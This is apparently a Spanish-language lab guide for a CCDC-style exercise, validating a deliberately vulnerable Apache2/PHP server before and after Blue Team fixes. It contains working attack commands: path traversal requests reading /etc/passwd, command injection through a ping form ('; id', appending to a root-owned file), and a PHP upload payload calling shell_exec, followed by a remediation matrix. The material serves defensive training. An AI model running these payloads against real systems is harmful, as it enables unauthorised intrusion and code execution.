Validación de Apache2 y PHP

Comandos de prueba y criterios de evaluación para comprobar el estado del servidor antes y después de las correcciones del Blue Team.

Ejecuta estas pruebas en la VM aislada del laboratorio autorizado.

00

Preparar la variable del servidor

Define la variable $ipphpserver en la terminal de tu máquina atacante o de administración para ejecutar las pruebas de validación contra tu servidor Apache2:

bash
export ipphpserver="192.168.1.100"  # Reemplaza con la IP real de tu servidor
Disponibilidad de los escenarios

El instservices actual crea /var/www/html/ccdc-lab.php y /var/www/html/uploads/team-notes.txt, asigna 666 a esos archivos y 777 a las carpetas web. Los archivos download.php, path-traversal.php, visor.php, ping_tool.php, basic-collection.php, upload.php e insecure-file-upload.php requieren instalación adicional. Un 404 indica una ruta ausente y no demuestra que la vulnerabilidad esté corregida.

Selecciona los nombres de tu instalación

Para la versión con visor.php y upload.php que ya respondió correctamente, usa estas variables en la misma terminal que las pruebas:

bash / zsh
ping_page=ping_tool.php
viewer_page=visor.php
upload_page=upload.php
upload_field=avatar

Si instalaste el script original instalador_de_laboratorio_php_vulnerable.sh de este repositorio, usa este bloque en su lugar. También cambia el campo de subida: archivo, no avatar.

bash / zsh
ping_page=ping-tool.php
viewer_page=visor-logs.php
upload_page=subir-archivo.php
upload_field=archivo

Comprueba las tres rutas antes de las pruebas. Un 200 confirma que la página responde, pero no demuestra una vulnerabilidad; revisa también el contenido. Un 404 indica una ruta ausente.

bash / zsh
for page in "$ping_page" "$viewer_page" "$upload_page"; do
    curl -sS -o /dev/null -w "%{http_code} %{url_effective}\n" "http://$ipphpserver/$page"
done
Instalación incompleta y set -e

El instalador original clona repositorios y copia archivos antes de crear las tres páginas locales. Con set -e, un fallo de git clone o una ruta de cp que ya no existe detiene el script antes de generarlas. Revisa el primer error de la instalación y confirma los archivos presentes en /var/www/html/. No interpretes ese fallo como una corrección de seguridad ni elimines set -e para ocultarlo.

01

Verificar los permisos en el servidor

Antes de lanzar las pruebas por red, comprueba en el servidor Apache2 el propietario y los permisos de los archivos instalados en /var/www/html/:

bash
ls -la /var/www/html/*.php /var/www/html/uploads/
ls -ld /var/www/html /var/www/html/uploads

Si preparaste el escenario con propietario root:root y permisos 777, observarás -rwxrwxrwx 1 root root en los archivos. Aunque el dueño sea root, el último bloque rwx permite que www-data sobrescriba el código. En el escenario actual con 666, aparecerá -rw-rw-rw-: también permite la escritura por otros usuarios. PHP no necesita el bit de ejecución del archivo para interpretarlo.

Los permisos 777 en las carpetas permiten además crear o reemplazar archivos dentro de ellas.

02

Pruebas de explotación por red

A. Directory Traversal / LFI

Las pruebas de download.php (del laboratorio web-app-security-lab), path-traversal.php (vulnerable-php-code-examples) y la plantilla visor.php comprueban si se pueden leer archivos fuera de la carpeta permitida. Confirma primero que están instalados y qué parámetros reciben.

bash
# 1. Explotar download.php para leer /etc/passwd
curl -sS "http://$ipphpserver/download.php?file=../../../../etc/passwd"

# 2. Explotar visor.php (si incluiste la plantilla del laboratorio)
curl -sS "http://$ipphpserver/$viewer_page?archivo=../../../../etc/passwd"

# 3. Verificar qué variable GET/POST usa path-traversal.php y probarla
curl -sS "http://$ipphpserver/path-traversal.php?file=../../../../etc/passwd"

Resultado vulnerable: la terminal devuelve el contenido de /etc/passwd, por ejemplo root:x:0:0:root:/root:/bin/bash.

Interpretación de la salida: si visor.php devuelve root:x:0:0:root:/root:/bin/bash, la lectura fuera de la carpeta permitida ya funcionó. Si uploads/payload.php devuelve uid=33(www-data), la subida y la ejecución de PHP también funcionaron.

B. Command Injection y abuso de permisos

Con $ping_page instalado, esta prueba verifica que PHP permite inyectar comandos del sistema y que www-data puede alterar archivos de root con escritura habilitada para otros usuarios. El segundo comando añade un comentario al archivo del laboratorio.

bash
# 1. Ver el usuario que corre Apache (www-data) y los permisos
curl -sS -X POST "http://$ipphpserver/$ping_page" \
  --data-urlencode 'ip=127.0.0.1; id; ls -l /var/www/html/ccdc-lab.php'

# 2. Modificar un archivo propiedad de root desde la web
curl -sS -X POST "http://$ipphpserver/$ping_page" \
  --data-urlencode 'ip=127.0.0.1; echo "<!-- CCDC: prueba de escritura -->" >> /var/www/html/ccdc-lab.php'

# 3. Comprobar que ccdc-lab.php fue alterado exitosamente
curl -sS "http://$ipphpserver/ccdc-lab.php" | tail -n 5
Zsh: event not found

Ese error ocurre en tu terminal antes de ejecutar curl: Zsh interpreta el signo ! del comentario HTML como expansión del historial cuando el argumento está entre comillas dobles. El comando corregido encierra todo el dato POST entre comillas simples y usa --data-urlencode. No necesitas desactivar el historial. La URL conserva comillas dobles para expandir las variables.

La prueba de escritura requiere que instservices haya creado ccdc-lab.php. Si falta ese archivo, no uses la prueba de escritura para evaluar sus permisos.

Tip para basic-collection.php: si utilizas esta colección de ejemplos de XSS, SQLi e inyección de comandos, consulta en el servidor los nombres exactos de los parámetros $_GET, $_POST o $_REQUEST antes de probarlos:

bash
grep -nE '\$_(GET|POST|REQUEST)' /var/www/html/basic-collection.php

C. Subida de PHP en /uploads/

Con $upload_page instalado, comprueba si un usuario puede subir un script .php a /var/www/html/uploads/ y ejecutarlo por HTTP. Este archivo de prueba ejecuta únicamente id. Ajusta la ruta del formulario y el campo $upload_field si tu plantilla usa otros nombres.

bash
# 1. Crear un script PHP de prueba local
echo '<?php echo "Ejecutando como: " . shell_exec("id"); ?>' > payload.php

# 2. Subirlo al servidor vulnerable
curl -sS -F "${upload_field}=@payload.php" "http://$ipphpserver/$upload_page"

# 3. Ejecutar el archivo subido en /uploads/
curl -sS "http://$ipphpserver/uploads/payload.php"

Resultado vulnerable: el servidor responde Ejecutando como: uid=33(www-data) gid=33(www-data)....

03

Matriz de evaluación

Cuando los jugadores terminen de corregir PHP y ajustar los permisos de Apache2, vuelve a ejecutar las pruebas y compara los resultados. Verifica también que las funciones legítimas sigan disponibles.

Vector probadoRespuesta vulnerableTras la corrección
Permisos en /var/www/html/www-data puede sobrescribir PHP de root con permisos 777 o 666.Archivos de código con 644 y carpetas de código con 755, propietario root:root. Apache no puede modificar el código. Si la aplicación necesita subir archivos, limita la escritura al directorio destinado a esas subidas.
Inyección de comandos (; id)Devuelve uid=33(www-data) debajo del ping.Un ping a una IP válida permitida funciona; ; id se rechaza como IP inválida y no ejecuta id.
Path TraversalImprime los usuarios de /etc/passwd.Solo permite archivos autorizados dentro de la carpeta prevista. Si usa realpath(), comprueba que la ruta resuelta permanezca dentro de esa carpeta; llamar a basename() o realpath() por sí solo no demuestra una corrección completa.
Ejecución en /uploads//uploads/payload.php ejecuta PHP.El formulario rechaza archivos PHP y Apache impide ejecutar scripts en las subidas. Un archivo PHP de prueba ya presente debe quedar bloqueado, por ejemplo con 403 Forbidden. Servir código fuente como texto plano evita su ejecución, pero no se considera una corrección completa.
